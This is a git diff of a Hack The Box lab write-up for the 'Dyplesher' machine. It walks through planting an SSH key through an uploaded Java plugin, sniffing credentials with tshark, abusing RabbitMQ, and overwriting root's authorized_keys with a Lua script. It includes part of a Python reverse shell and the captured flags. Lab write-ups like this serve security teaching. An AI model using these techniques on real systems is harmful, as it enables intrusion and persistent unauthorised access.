@@ -1055,9 +1055,24 @@ One of the required files I had to create was called plugin.yml, and contained s
 
 Another required file for the plugin was `pom.xml`.  This one contained basic information about the plugin such as the name, version,  and the dependencies.
 
+```text
+┌──(zweilos㉿kali)-[~/htb/dyplesher] 
+└─$ ssh-keygen -t ecdsa Generating public/private ecdsa key pair. 
+Enter file in which to save the key (/home/zweilos/.ssh/id_ecdsa): dyplesher.key 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in dyplesher.key Your public key has been saved in dyplesher.key.pub
+
+┌──(zweilos㉿kali)-[~/htb/dyplesher] 
+└─$ cat dyplesher.key.pub
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali
+```
+
+I created a new SSH key to use to try to log in to each user on the machine.
+
 ```java
 /**
- * backdoor for dyplesher
+ * key-writer plugin for dyplesher
  *
  * @author zweilos
  */
@@ -1086,26 +1101,11 @@ public class Plugin extends JavaPlugin {
 }
 ```
 
-I created my java plugin to write my an  to the authorized\_keys file of each user, first in `/home/MinatoTW/.ssh`.  After uploading my plugin on the site and reloading the page I tried to log in through SSH.
+For the main Java program I wrote my plugin to write the public key I generated to the `authorized_keys` file of each user, to the default folder such as `/home/MinatoTW/.ssh`.  After uploading my plugin on the site and reloading the page I tried to log in through SSH.
 
 ![](../../.gitbook/assets/16-code.png)
 
-The final list of files included in my project before compiling.
-
-```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher] 
-└─$ ssh-keygen -t ecdsa Generating public/private ecdsa key pair. 
-Enter file in which to save the key (/home/zweilos/.ssh/id_ecdsa): minato.key 
-Enter passphrase (empty for no passphrase): 
-Enter same passphrase again: 
-Your identification has been saved in minato.key Your public key has been saved in minato.key.pub
-
-┌──(zweilos㉿kali)-[~/htb/dyplesher] 
-└─$ cat minato.key.pub
-ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali
-```
-
-I created a new ssh key 
+The final list of files included in my project before compiling.  After I built my `dyplesher-plugin.jar` file I uploaded it through the portal and hoped that it would pass inspection and be loaded.
 
 ## Initial Foothold
 
@@ -1113,7 +1113,7 @@ I created a new ssh key
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
-└─$ ssh -i minato.key MinatoTW@dyplesher.htb 
+└─$ ssh -i dyplesher.key MinatoTW@dyplesher.htb 
 The authenticity of host 'dyplesher.htb (10.10.10.190)' can't be established.
 ECDSA key fingerprint is SHA256:8AtWtgBblX2fSG+yy8gqhogbr3lHiMCppbBkL1YY/Cg.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -1146,9 +1146,11 @@ uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
 dyplesher
 ```
 
+After uploading my plugin I waited a short time, then tried to login to my first victim, `MinatoTW`.  I was pleasantly surprised to get logged in immediately.  I was a little sad after all that work, however, to find that this user did not have `user.txt`.  
+
 ### Reading local traffic with Tshark/Wireshark
 
-Immediately I noticed that this user was in the Wireshark group, which sounded interesting. 
+My first bit of enumeration I always do when logging in as a new user is find out who I am and what privileges and permission I have.  Immediately I noticed that this user was in the Wireshark group, which sounded quite interesting as it meant that I could probably capture traffic on the local host. 
 
 ```text
 MinatoTW@dyplesher:~$ tshark -i any -w /dev/shm/dyplesher.pcapng
@@ -1156,40 +1158,45 @@ Capturing on 'any'
 249
 ```
 
-Since I didn't have a gui I decided to try running tshark to see if there was interesting traffic on the host.  I wrote the captured packets to a .pcapng file and exfiltrated it to my computer after capturing for a few minutes
+Since I didn't have a GUI I decided to try running tshark to see if there was interesting traffic on the host. I wrote the captured packets to a .pcapng file and exfiltrated it to my computer after capturing for a few minutes.
 
 ![](../../.gitbook/assets/17-wireshark-erlang-rabbit.png)
 
+I noticed pretty quickly the Erlang Port Mapper traffic identifying port 25672 as a RabbitMQ node.
+
 ![](../../.gitbook/assets/17-wireshark-memcached.png)
 
-Wireshark pictures
+Next I identified some traffic that contained the memcache information I had pulled from that service earlier.  It looked like there was a `backup.sh` shell script running that was either reading to or writing an email, username, and password key to memcache.
 
 ![](../../.gitbook/assets/17-wireshark-amqp%20%281%29.png)
 
-### Finding user creds
+My next find in the packet capture was a jackpot.  There was a full list of user information being sent through AMQP that contained names, emails, and passwords for a list of users, amongst other information.
 
-found list of users and passwords
+### Finding user creds
 
 ```text
 AMQPLAIN...,.LOGINS....yuntao.PASSWORDS...
 EashAnicOc3Op
 ```
 
-There was a login username and password for AMQPLAIN, which turned out to be the AAA controls for RabbitMQ \(Which I saw open on port 5672 earlier in my nmap output\) - [https://www.rabbitmq.com/access-control.html](https://www.rabbitmq.com/access-control.html)
+There was a login username and password for AMQPLAIN, which turned out to be the AAA controls for RabbitMQ \(Which I saw open on port 5672 earlier in my nmap output\). 
 
-[https://www.amqp.org/about/what](https://www.amqp.org/about/what)
+* [https://www.rabbitmq.com/access-control.html](https://www.rabbitmq.com/access-control.html)
+* [https://www.amqp.org/about/what](https://www.amqp.org/about/what)
 
 > The Advanced Message Queuing Protocol \(AMQP\) is an open standard for passing business messages between applications or organizations. It connects systems, feeds business processes with the information they need and reliably transmits onward the instructions that achieve their goals.
 >
 > AMQP enables applications send and receive messages. In this regard it is like instant messaging or email.
-
-
 
 ```text
 Only root or rabbitmq should run rabbitmqctl
 ```
 
 I tried adding a user but got an error. I guess I need to find a user in the rabbitmq group?
+
+{% hint style="info" %}
+Again I seem to have either failed to take notes, or something got deleted or overwritten in Joplin.  What I had done was: I tried using rabbitmgctl to add a user account for myself but got back the error message above.
+{% endhint %}
 
 ```text
 {"name":"Golda Rosenbaum","email":"randi.friesen@yahoo.com","address":"313 Scot Meadows Suite 035\nNorth Leann, ID 97610-9866","password":"ev6GwyaHTl5D","subscribed":true}
@@ -1205,7 +1212,7 @@ I tried adding a user but got an error. I guess I need to find a user in the rab
 {"name":"Jamarcus Sanford","email":"americo83@bode.info","address":"4895 Clark Plains Suite 173\nLake Rudolphburgh, IL 64916","password":"ev6GwyaHTl5D","subscribed":true}
 ```
 
-The first set of users all had the same password, 
+The first set of users from the packet capture all had the same password, 
 
 ```text
 {"name":"MinatoTW","email":"MinatoTW@dyplesher.htb","address":"India","password":"bihys1amFov","subscribed":true}
@@ -1219,7 +1226,7 @@ However the last three names seemed familiar and each had unique passwords.
 
 ### Further enumeration as `MinatoTW`
 
-
+Before trying to login as another user, I decided to look around a bit as `MinatoTW` first.
 
 ```text
 MinatoTW@dyplesher:~$ ls -la
@@ -1244,9 +1251,7 @@ drwx------  2 MinatoTW MinatoTW  4096 May 20 13:45 .ssh
 -rw-------  1 MinatoTW MinatoTW   802 Apr 23 15:18 .viminfo
 ```
 
-
-
-enumerating a bit more as MinatoTW
+This user's folder contained a few folders, and a lot of standard Linux user files that contained nothing useful.
 
 ```text
 MinatoTW@dyplesher:~$ cd Cuberite/
@@ -1292,6 +1297,8 @@ drwxrwxr-x  4 MinatoTW MinatoTW    4096 Sep  8  2019 world_nether
 drwxrwxr-x  4 MinatoTW MinatoTW    4096 Sep  8  2019 world_the_end
 ```
 
+The `/Cuberite` folder contained a lot of files which looked to again be related to the Minecraft server.  After spending a lot of time looking through them, I concluded there was nothing interesting here.
+
 ```text
 MinatoTW@dyplesher:~$ cd backup/
 MinatoTW@dyplesher:~/backup$ ls
@@ -1319,7 +1326,15 @@ MinatoTW@dyplesher:~/backup$ cat username
 MinatoTW
 felamos
 yuntao
+```
 
+The next folder contained the `backup.sh` script I had noticed in my Wireshark packet capture.  
+
+![](../../.gitbook/assets/18-backup-script.png)
+
+In the `/backup` folder I found the script and files that had given me information earlier through memcached.
+
+```text
 MinatoTW@dyplesher:~$ cd paper
 MinatoTW@dyplesher:~/paper$ ls -la
 total 39392
@@ -1347,9 +1362,7 @@ drwxrwxr-x  4 MinatoTW MinatoTW     4096 May 20 13:43 plugins
 drwxrwxr-x  5 MinatoTW MinatoTW     4096 Oct 12 13:21 world
 ```
 
-![](../../.gitbook/assets/18-backup-script.png)
-
-In the backup folder I found the script and files that had given me information earlier through memcached
+The `/paper` folder contained even more plugin and configuration info for the Minecraft server, but again, nothing useful was there.
 
 ```text
 MinatoTW@dyplesher:~/Cuberite/Plugins/DumpInfo$ sudo -l
@@ -1360,9 +1373,11 @@ Password:
 felamos@dyplesher:/home/MinatoTW/Cuberite/Plugins/DumpInfo$ cd ~
 ```
 
-asd
+Lastly, I tried checking if `MinatoTW` was able to run any commands as `sudo`, but despite the password I had found working for the user, I was unable to run any superuser commands.
 
 ### Enumeration as `felamos`
+
+Next I tried using `felamos` password to switch users, and was successful.
 
 ```text
 felamos@dyplesher:~$ ls -la
@@ -1390,6 +1405,8 @@ Sorry, user felamos may not run sudo on dyplesher.
 
 ```
 
+`felamos` was also unable to run `sudo` commands.
+
 ### User.txt
 
 ```text
@@ -1397,27 +1414,19 @@ felamos@dyplesher:~$ cat user.txt
 a8ffa4d970e7a74c9039b7afd39c9dc8
 ```
 
-I found the user.txt by `su`ing to `felamos`, but unfortunately no rabbit group and no sudo
-
-```text
-#!/bin/bash
-
-echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' >  /dev/pts/{}
-```
-
-aedh
+However, I was happy to find the `user.txt` file under this user's home directory.
 
 ![](../../.gitbook/assets/18-yuntao-note.png)
 
-in the yuntao folder there was a note `send.sh` regarding user created plugins and using the `plugin_data` Exchange and Queue. It also says to send the url of new plugins and the server wil automatically add them. This looks like a good privilege escalation route if I can figure out how to send
+in the `/yuntao` folder there was a file called`send.sh` with a note to `yuntao` regarding user created plugins and using the `plugin_data` Exchange and Queue. It also says to send the URL of new plugins and the server wil automatically add them. This looks like a good privilege escalation route if I could figure out how to publish a cuberite plugin.
 
 ![](../../.gitbook/assets/19-screen1.png)
 
-noticed `screen` was running so I attached to each of the two sessions
+While checking out running processes I noticed `screen` was running so I attached to each of the two sessions,
 
 ![](../../.gitbook/assets/19-screen2.png.png)
 
-nothing useful, looks like gameworld information
+but unfortunately neither had anything useful, and looked like it was all running gameworld information.
 
 ```text
 felamos@dyplesher:~/yuntao$ cat /etc/passwd
@@ -1462,9 +1471,13 @@ epmd:x:114:120::/var/run/epmd:/usr/sbin/nologin
 rabbitmq:x:115:121:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
 ```
 
-after checking `/etc/passwd` I noticed something a bit strange...is `git` usually able to login with a shell?
+{% hint style="info" %}
+after checking **`/etc/passwd`** I noticed something a bit strange...is **`git`** usually able to login with a shell?
+{% endhint %}
 
 ### Enumeration as `yuntao`
+
+Since I hadn't found much useful information as `felamos` besides the hint about cuberite plugins, I decided to try switching to the third user, `yuntao`.
 
 ```text
 felamos@dyplesher:/home$ su yuntao
@@ -1485,11 +1498,7 @@ yuntao@dyplesher:~$ sudo -l
 Sorry, user yuntao may not run sudo on dyplesher.
 ```
 
-Well now I had three users that I could freely `su` between, but I was still missing something
-
-searching for privilege escalation and rabbitMQ led to [https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management](https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management)
-
-found a way to interact with rabbitMQ through python at [https://www.rabbitmq.com/tutorials/tutorial-one-python.html](https://www.rabbitmq.com/tutorials/tutorial-one-python.html)
+Now I confirmed that I had three users that I could freely `su` between, but I was still missing something.  `yuntao` was also unable to use `sudo`, and I still hadn't found a way to interact with the RabbitMQ service or upload cuberite plugins.  Next I searched for privilege escalation and RabbitMQ led to [https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management](https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management).  I also found a way to interact with RabbitMQ through python at [https://www.rabbitmq.com/tutorials/tutorial-one-python.html](https://www.rabbitmq.com/tutorials/tutorial-one-python.html). 
 
 ```python
 #!/usr/bin/env python3
@@ -1511,11 +1520,13 @@ print(" [x] 'Hello World!'")
 connection.close()
 ```
 
-I created a test script to see if I could send messages through rabbit...unfortunately there was no pika module installed. I installed the pika module on my machine and looked up how to connect remotely
+I created a test script using the information in the article to see if I could send messages through rabbit... but unfortunately there was no pika module installed on dyplesher. I installed the pika module on my machine and looked up how to connect remotely.
 
-[https://github.com/pika/pika](https://github.com/pika/pika) [https://pika.readthedocs.io/en/stable/](https://pika.readthedocs.io/en/stable/) [https://stackoverflow.com/questions/27805086/how-to-connect-pika-to-rabbitmq-remote-server-python-pika](https://stackoverflow.com/questions/27805086/how-to-connect-pika-to-rabbitmq-remote-server-python-pika)
+* [https://github.com/pika/pika](https://github.com/pika/pika) [https://pika.readthedocs.io/en/stable/](https://pika.readthedocs.io/en/stable/) 
+* [https://stackoverflow.com/questions/27805086/how-to-connect-pika-to-rabbitmq-remote-server-python-pika](https://stackoverflow.com/questions/27805086/how-to-connect-pika-to-rabbitmq-remote-server-python-pika)
+* [https://www.spigotmc.org/threads/rabbitmq-plugin.74032/](https://www.spigotmc.org/threads/rabbitmq-plugin.74032/)
 
-[https://www.spigotmc.org/threads/rabbitmq-plugin.74032/](https://www.spigotmc.org/threads/rabbitmq-plugin.74032/)
+I found a few articles that gave me some good information, including one that specifically dealt with using RabbitMQ to communicate with Minecraft.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/dyplesher]
@@ -1530,7 +1541,7 @@ Traceback (most recent call last):
 pika.exceptions.ChannelClosedByBroker: (406, "PRECONDITION_FAILED - inequivalent arg 'durable' for queue 'plugin_data' in vhost '/': received 'false' but current is 'true'")
 ```
 
-using the message I had found in the `yuntao` folder in `felamos` home folder I set the Queue and routing\_key to be `plugin_data`, however it seems like setting the Queue caused an error.
+Using the message I had found in the `yuntao` folder in `felamos` home folder I set the `Queue` and `routing_key` to be `plugin_data`, however it setting the `Queue` caused an error.
 
 ```python
 #!/usr/bin/env python3
@@ -1558,7 +1569,7 @@ print(" [x] 'Hello World!'")
 connection.close()
 ```
 
-I ran a python http server on the local machine since the note in the `yuntao` folder had mentioned entering a url for plugins. Next I ran the script again and was able to see it connect to my server on the dyplesher machine.
+Next I tried running a python3 http.server on the local machine since the note in the `yuntao` folder had mentioned entering a URL for plugins. After doing some troubleshooting, I found that commenting out the `queue.declare` line allowed me to connect to the service.  I ran my script again and was able to see it connect to my test server on the dyplesher machine. 
 
 ```python
 #!/usr/bin/env python3
@@ -1578,7 +1589,7 @@ os.dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
 ```
 
-I wrote a python reverse shell back to my machine
+I wrote a python reverse shell back to my machine and tried to get my script to execute it.  
 
 ```text
 MinatoTW@dyplesher:/dev/shm$ python3 -m http.server 8090
@@ -1588,7 +1599,7 @@ Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
 Keyboard interrupt received, exiting.
 ```
 
-My script worked, and connected to the http server and got my file, but the python reverse shell didnt work...and neither did writing to `root`'s authorized\_keys file after modifying the local script. I decided to do some more enumeration of the files in MinatoTW's folder to see if there was anything that I missed that could give me any clues as how to proceed
+My script worked, connected to the http server, and retreived my python script, but the python reverse shell didnt work...and neither did writing to `root`'s `authorized_keys` file after modifying the local script. I decided to do some more enumeration of the files in MinatoTW's folder to see if there was anything that I missed that could give me any clues as how to proceed.  
 
 {% hint style="info" %}
 Side Note: Python3's **`http.server`** exits much cleaner than the verbose error messages **`SimpleHTTPServer`** from python2 gives!  Sometimes it's the little things that make us happy :\)
@@ -1673,19 +1684,19 @@ drwxr-xr-x 3 MinatoTW MinatoTW 4096 Oct 12 14:30 ..
 -rw-r--r-- 1 MinatoTW MinatoTW  132 Sep  7  2019 thead.png
 ```
 
-In the Cuberite folder I found some files related to the Minecraft server called Cuberite. In the `webadmin` folder I found some files related to generating keys and a script that would generate self-signed keys for the server. 
+I went back and looked closer into the Minecraft related files in `MinatoTW`'s user folder.  In the `webadmin` folder I found some files related to generating keys and a script that would generate self-signed keys for the server. 
 
 ![](../../.gitbook/assets/20-cuberite-webadmin.png)
 
-The `template.lua` file included code for loading plugins and running code for the webadmin site
+The `template.lua` file included code for loading plugins and running code for the webadmin site.  I did some research on lua and cRoot, which led me to pages related to Cuberite, which made me sure I was on the right track.  
 
-doing a search for lua cRoot led me to pages related to Cuberite - [https://api.cuberite.org/cRoot.html](https://api.cuberite.org/cRoot.html)
+[https://api.cuberite.org/cRoot.html](https://api.cuberite.org/cRoot.html)
 
 > cRoot class
 >
 > This class represents the root of Cuberite's object hierarchy. There is always only one cRoot object. It manages and allows querying all the other objects, such as cServer, cPluginManager, individual worlds etc.
 
-If this server will execute lua scripts as code then perhaps I could use one to either send me a shell or write an SSH key
+If this server will execute Lua scripts as code then perhaps I could use one to either send me a shell or write an SSH key...unfortunately I had never written anything in Lua, so I had some more reading to do.  I found a good resource which showed me that writing to a file was just as easy as in python.  
 
 [https://www.tutorialspoint.com/lua/lua\_file\_io.htm](https://www.tutorialspoint.com/lua/lua_file_io.htm)
 
@@ -1697,11 +1708,11 @@ file.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYA
 file.close()
 ```
 
-I tested my Lua script by running it and appending my SSH key \(again\) to MinatoTW's file, and was successful
+I tested my Lua script by using it to append my SSH key \(again\) to `MinatoTW`'s `authorized_keys` file, and was successful!
 
 ### Getting a shell
 
-Next I tried running the script against root through my remote RabbitMQ connection
+Next I tried running the script against root through my remote RabbitMQ connection.
 
 ```lua
 file = io.open("/root/.ssh/authorized_keys", "w")
@@ -1711,7 +1722,7 @@ file.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYA
 file.close()
 ```
 
-after some troubleshooting...I realized that for some reason the file was not being opened for appending. Changing the 'mode' to write made everything work~
+My first try was unsuccessful, but after some troubleshooting, I realized that for some reason the file was not being opened for appending. Changing the file open mode to `write` made everything work~
 
 ### Root.txt
 
@@ -1746,6 +1757,8 @@ dyplesher
 root@dyplesher:~# cat root.txt 
 a0a4e509a610c426f8eb668a977774f0
 ```
+
+After writing my public key to `root` it was simple to login using SSH and collect my hard-earned proof!
 
 ![](../../.gitbook/assets/21-pwned-.png)
 
